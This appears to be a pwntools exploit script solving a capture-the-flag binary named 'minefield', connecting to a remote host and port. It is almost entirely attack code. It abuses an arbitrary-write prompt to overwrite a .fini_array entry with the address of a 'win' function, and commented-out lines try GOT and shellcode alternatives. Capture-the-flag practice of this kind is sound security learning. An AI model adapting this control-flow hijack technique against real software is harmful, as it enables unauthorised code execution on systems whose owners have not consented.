from pwn import *

    # Arch:     amd64-64-little
    # RELRO:    No RELRO
    # Stack:    Canary found
    # NX:       NX enabled
    # PIE:      No PIE (0x400000)

exe = './minefield'
context.binary = exe

# p = process(exe)
p = remote('178.62.50.172', 30707)
# libc = ELF('./libc.self')

elf = ELF(exe)

p.sendlineafter('> ', '2')

address = elf.got['puts']
value = elf.sym['_']

#strtoull accepts hex strings


# # address of code to write 0x00400ae0
# CODE_LOCATION = 0x00400ae0
# # win function is 0x0040096b
WIN_FUNCTION = 0x0040096b

address = 0x00601078 # _DT_FINI array entry

# code = asm(f"jmp [rip-{hex(CODE_LOCATION - WIN_FUNCTION)}]")
# print(disasm(code))
# shellcode_int = int.from_bytes(code, 'little')

p.sendlineafter(': ', hex(address)) # address
# gdb.attach(p)
p.sendlineafter(': ', hex(WIN_FUNCTION)) # value to write

print(p.recvall())
